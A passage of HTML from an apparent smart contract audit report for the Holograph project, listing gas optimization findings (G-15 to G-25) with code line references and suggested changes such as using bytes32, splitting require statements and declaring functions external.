style=\"position:relative;\"><a href=\"#g-15-use-bytes32-instead-of-string\" aria-label=\"g 15 use bytes32 instead of string permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-15] Use bytes32 instead of string</h2>\n<p>Use bytes32 instead of string to save gas whenever possible. String is a dynamic data structure and therefore is more gas consuming then bytes32.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::142 =&gt; string constant _bpString = &quot;eip1967.Holograph.PA1D.bp&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::143 =&gt; string constant _receiverString = &quot;eip1967.Holograph.PA1D.receiver&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::144 =&gt; string constant _tokenAddressString = &quot;eip1967.Holograph.PA1D.tokenAddress&quot;;</span></span></code></pre>\n<h2 id=\"g-16-splitting-require-statements-that-use--saves-gas\" style=\"position:relative;\"><a href=\"#g-16-splitting-require-statements-that-use--saves-gas\" aria-label=\"g 16 splitting require statements that use  saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-16] Splitting require() statements that use &#x26;&#x26; saves gas</h2>\n<p>Saves 16 gas per instance.\nIf you’re using the Optimizer at 200, instead of using the &#x26;&#x26; operator in a single require statement to check multiple conditions, multiple require statements with 1 condition per require statement should be used to save gas:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::857 =&gt; require(_bondedOperators[operator] == 0 &amp;&amp; _bondedAmounts[operator] == 0, &quot;HOLOGRAPH: operator is bonded&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::263 =&gt; require(success &amp;&amp; selector == InitializableInterface.init.selector, &quot;ERC721: coud not init PA1D&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/Holographer.sol::166 =&gt; require(success &amp;&amp; selector == InitializableInterface.init.selector, &quot;initialization failed&quot;);</span></span></code></pre>\n<h2 id=\"g-17-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" style=\"position:relative;\"><a href=\"#g-17-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" aria-label=\"g 17 public functions not called by the contract should be declared external instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-17] Public functions not called by the contract should be declared external instead</h2>\n<p>Contracts are allowed to override their parents’ functions and change the visibility from external to public and can save gas by doing so.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::273 =&gt; function decimals() public view returns (uint8) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::297 =&gt; function allowance(address account, address spender) public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::306 =&gt; function DOMAIN_SEPARATOR() public view returns (bytes32) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::310 =&gt; function name() public view returns (string memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::314 =&gt; function nonces(address account) public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::318 =&gt; function symbol() public view returns (string memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::322 =&gt; function totalSupply() public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::347 =&gt; function burnFrom(address account, uint256 amount) public returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::363 =&gt; function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::420 =&gt; function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::643 =&gt; function burned(uint256 tokenId) public view returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::471 =&gt; function configurePayouts(address payable[] memory addresses, uint256[] memory bps) public onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::488 =&gt; function getPayoutInfo() public view returns (address payable[] memory addresses, uint256[] memory bps) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::497 =&gt; function getEthPayout() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::507 =&gt; function getTokenPayout(address tokenAddress) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::517 =&gt; function getTokensPayout(address[] memory tokenAddresses) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::549 =&gt; function royaltyInfo(uint256 tokenId, uint256 value) public view returns (address, uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::558 =&gt; function getFeeBps(uint256 tokenId) public view returns (uint256[] memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::569 =&gt; function getFeeRecipients(uint256 tokenId) public view returns (address payable[] memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::604 =&gt; function getFees(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::649 =&gt; function marketContract() public view returns (address) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::655 =&gt; function tokenCreators(uint256 tokenId) public view returns (address) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::665 =&gt; function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {</span></span></code></pre>\n<h2 id=\"g-18-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas\" style=\"position:relative;\"><a href=\"#g-18-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas\" aria-label=\"g 18 not using the named return variables when a function returns wastes deployment gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-18] Not using the named return variables when a function returns, wastes deployment gas</h2>\n<p>It is not necessary to have both a named return and a return statement.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::181 =&gt; ) external pure returns (bytes4 selector, bytes memory data) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::717 =&gt; function getTotalPods() external view returns (uint256 totalPods) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::804 =&gt; function getBondedAmount(address operator) external view returns (uint256 amount) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::814 =&gt; function getBondedPod(address operator) external view returns (uint256 pod) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::396 =&gt; ) external onlyBridge returns (bytes4 selector, bytes memory data) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::417 =&gt; ) external onlyBridge returns (bytes4 selector, bytes memory data) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::761 =&gt; try HolographERC721Interface(_operator).ownerOf(_tokenId) returns (address tokenOwner) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::549 =&gt; function royaltyInfo(uint256 tokenId, uint256 value) public view returns (address, uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::569 =&gt; function getFeeRecipients(uint256 tokenId) public view returns (address payable[] memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::590 =&gt; function getRoyalties(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::604 =&gt; function getFees(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::665 =&gt; function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::256 =&gt; ) external view returns (uint256 hlgFee, uint256 msgFee) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::281 =&gt; ) external view returns (uint256 hlgFee) {</span></span></code></pre>\n<h2 id=\"g-19-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#g-19-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" aria-label=\"g 19 multiple address mappings can be combined into a single mapping of an address to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-19] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</h2>\n<p>Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - 30 gas) and that calculation’s associated stack operations.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::218 =&gt; mapping(address =&gt; uint256) private _bondedOperators;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::223 =&gt; mapping(address =&gt; uint256) private _operatorPodIndex;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::228 =&gt; mapping(address =&gt; uint256) private _bondedAmounts;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::156 =&gt; mapping(address =&gt; uint256) private _balances;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::161 =&gt; mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::186 =&gt; mapping(address =&gt; uint256) private _nonces;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::185 =&gt; mapping(address =&gt; uint256) private _ownedTokensCount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::190 =&gt; mapping(address =&gt; uint256[]) private _ownedTokens;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::196 =&gt; mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;</span></span></code></pre>\n<h2 id=\"g-20-use-assembly-to-check-for-address0\" style=\"position:relative;\"><a href=\"#g-20-use-assembly-to-check-for-address0\" aria-label=\"g 20 use assembly to check for address0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-20] Use assembly to check for address(0)</h2>\n<p>Saves 6 gas per instance if using assembly to check for address(0)</p>\n<p>e.g.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> if iszero(_addr) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  mstore(0x00, &quot;zero address&quot;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  revert(0x00, 0x20)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::333 =&gt; if (job.operator != address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::620 =&gt; require(account != address(0), &quot;ERC20: account is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::621 =&gt; require(spender != address(0), &quot;ERC20: spender is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::627 =&gt; require(account != address(0), &quot;ERC20: account is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::684 =&gt; require(to != address(0), &quot;ERC20: minting to burn address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::695 =&gt; require(account != address(0), &quot;ERC20: account is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::696 =&gt; require(recipient != address(0), &quot;ERC20: recipient is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::419 =&gt; require(to != address(0), &quot;ERC721: zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::639 =&gt; require(wallet != address(0), &quot;ERC721: zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::657 =&gt; return _tokenOwner[tokenId] != address(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::689 =&gt; require(tokenOwner != address(0), &quot;ERC721: token does not exist&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::816 =&gt; require(to != address(0), &quot;ERC721: minting to burn address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::870 =&gt; require(to != address(0), &quot;ERC721: use burn instead&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::895 =&gt; return tokenOwner != address(0);</span></span></code></pre>\n<h2 id=\"g-21-use-selfbalance\" style=\"position:relative;\"><a href=\"#g-21-use-selfbalance\" aria-label=\"g 21 use selfbalance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-21] Use selfbalance()</h2>\n<p>Use selfbalance() instead of address(this).balance when getting your contract’s balance of ETH to save gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::389 =&gt; uint256 balance = address(this).balance;</span></span></code></pre>\n<h2 id=\"g-22-using-storage-instead-of-memory-for-structsarrays-saves-gas\" style=\"position:relative;\"><a href=\"#g-22-using-storage-instead-of-memory-for-structsarrays-saves-gas\" aria-label=\"g 22 using storage instead of memory for structsarrays saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-22] Using storage instead of memory for structs/arrays saves gas</h2>\n<p>When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read.</p>\n<p>Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::541 =&gt; address[] memory receivers = new address[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::543 =&gt; uint256[] memory bps = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::559 =&gt; uint256[] memory bps = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::570 =&gt; address payable[] memory receivers = new address payable[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::591 =&gt; address payable[] memory receivers = new address payable[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::592 =&gt; uint256[] memory bps = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::605 =&gt; address payable[] memory receivers = new address payable[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::606 =&gt; uint256[] memory bps = new uint256[](1);</span></span></code></pre>\n<h2 id=\"g-23-internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g-23-internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g 23 internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-23] internal functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::203 =&gt; function _setOwner(address ownerAddress) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::203 =&gt; function _setOwner(address ownerAddress) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::225 =&gt; * @dev Need to add an extra function to get LZ gas amount needed for their internal cross-chain message verification</span></span></code></pre>\n<h2 id=\"g-25-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas\" style=\"position:relative;\"><a href=\"#g-25-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas\" aria-label=\"g 25 internal functions not called by the contract should be removed to save deployment gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-25] internal functions not called by the contract should be removed to save deployment gas</h2>\n<p>If the functions are required by an interface, the contract should inherit from that interface and use the override keyword</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::203 =&gt; function _setOwner(address ownerAddress) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::203 =&gt; function _setOwner(address ownerAddress) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::225 =&gt; * @dev Need to add an extra function to get LZ gas amount needed for their internal cross-chain message verification</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/313#event-7777371550\">alexanderattar (Holograph) confirmed</a></strong></p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" 